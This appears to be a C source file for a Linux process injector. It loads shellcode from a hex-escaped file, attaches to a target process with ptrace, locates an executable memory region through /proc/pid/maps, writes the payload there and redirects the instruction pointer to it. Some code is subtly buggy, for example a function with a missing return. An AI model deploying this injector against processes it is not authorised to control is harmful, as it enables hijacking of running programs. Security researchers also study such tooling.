#include "injector.h"
#include <string.h>


int file2buf(const char* fpath, unsigned char** buffer, size_t* buffer_len)
{
    FILE *fd = fopen(fpath, "r");
    unsigned char *buf;
    int b_length = 0, c;
    struct stat st;

    fstat(fileno(fd), &st);
    buf = malloc(st.st_size);
    CHECK_MEMORY_ALLOC(buf);

    while (fscanf(fd, "\\x%02x", &c) != EOF)
        buf[b_length++] = c;
    
    *buffer = buf;
    *buffer_len = b_length;

    fclose(fd);
    return 0;
}

int ptrace_setregs(pid_t pid, struct user_regs_struct *regs){
    info("Jump to address %p\n", regs->rip);

    if (ptrace(PTRACE_SETREGS, pid, NULL, regs) < 0){
        perror("SETREGS FAILURE");
        return -1;
    }
    return 0;
}

int ptrace_attach(pid_t pid)
{
    int status = 0;

    if (ptrace(PTRACE_ATTACH, pid, NULL, 0) < 0)
    {
        perror("Failed to attach to the process");
        exit(EXIT_FAILURE);
    }

    info("Waiting for SIGTRAP...\n");
    waitpid(pid, &status, WUNTRACED);
    info("Process attachment completed\n");

    return 0;
}

struct user_regs_struct *ptrace_getregs(pid_t pid)
{
    struct user_regs_struct *registers = malloc(sizeof(struct user_regs_struct));
    CHECK_MEMORY_ALLOC(registers)

    if (ptrace(PTRACE_GETREGS, pid, NULL, registers) < 0)
    {
        perror("Failed to getregs to the process");
        exit(EXIT_FAILURE);
    }
    info("Registers:\n    RIP: %p\n    RSP: %p\n", registers->rip, registers->rsp, registers->rbp);
    return registers;
}

int ptrace_poketext(pid_t pid, long address, unsigned long *payload, size_t len_buffer){
    size_t i;

    for (i = 0; i < len_buffer; i += 8, payload++) {
        if (ptrace(PTRACE_POKETEXT, pid, address + i, *payload) < 0) {
            perror("PTRACE_POKETEXT");
            exit(EXIT_FAILURE);
        }
    }
    return 0;
}

unsigned int retrieve_maxPID_value()
{
    unsigned int max_pid_value;

    FILE *read_max_pid = fopen(PROC_SYS_KERNEL_PID_MAX_PATH, "r");
    if (!read_max_pid)
        return DEFAULT_PID_MAX;

    char *tmp_buffer = malloc(PID_BUFFER_LENGTH);
    CHECK_MEMORY_ALLOC(tmp_buffer);

    if ((fgets(tmp_buffer, PID_BUFFER_LENGTH, read_max_pid)) == NULL)
    {
        perror("Unable to read the file /proc/sys/kernel/pid_max");

        free(tmp_buffer);
        fclose(read_max_pid);

        return DEFAULT_PID_MAX;
    }

    if ((max_pid_value = _atoi(tmp_buffer)) == 0)
    {
        perror("Unable to parse /proc/sys/kernel/pid_max");
        max_pid_value = DEFAULT_PID_MAX;
    }
    free(tmp_buffer);
    fclose(read_max_pid);

    return max_pid_value;
}

uint8_t get_mem_perms(char *line)
{
    uint8_t perm = 0;
    char *s = line;
    int i = 0;

    // Avança até o primeiro espaço em branco
    while (s[i] != ' ')
        ++i;

    // Avança para o próximo caractere após o espaço em branco
    ++i;

    /** Verifica as permissões
     *  4  = r---
     *  2  = -w--
     *  1  = --x-
     *  10 = r-xp
     */

    if (s[i + 0x03] == '\x70') perm += 0x05;
    if (s[i + 0x00] == '\x72') perm += 0x04; 
    if (s[i + 0x01] == '\x77') perm += 0x02; 
    if (s[i + 0x02] == '\x78') perm += 0x01;

    return perm;
}

long get_mem_addr(char *buffer)
{
    char *s = buffer;
    int i = 0, z = 0;

    while (s[i] != '-')
        i++;

    char *pbuffer = malloc(i * sizeof(char) + 1);
    CHECK_MEMORY_ALLOC(pbuffer);

    char *aux = pbuffer;

    while (z < i)
    {
        *aux++ = s[z];
        z++;
    }
    *aux++ = '\0';

    long addr = strtol(pbuffer, NULL, 16);
    free(pbuffer);
    return addr;
}

proc_maps_t *proc_mappings(pid_t pid)
{
    proc_maps_t *proc_mapping;

    char *buffer = NULL;
    char *path __attribute__((cleanup(freestr_)));
    size_t s_buffer;

    path = asprintfEx("/proc/%d/maps", pid);
    if (!path)
    {
        perror("Unable to parse /proc/<pid>/maps");
        return NULL;
    }

    FILE *fd = fopen(path, "r");
    if (!fd)
    {
        perror("Could not read the file /proc/<pid>/maps");
        return NULL;
    }

    proc_maps_t *ret = calloc(1, sizeof(proc_maps_t));
    while (getline(&buffer, &s_buffer, fd) != -1)
    {
        ret->permissions = get_mem_perms(buffer);
        if (ret->permissions == 0x0A)
        {
            ret->address = get_mem_addr(buffer);
            info("r-xp section address: %p\n", ret->address);
            return ret;
        }
    }
}

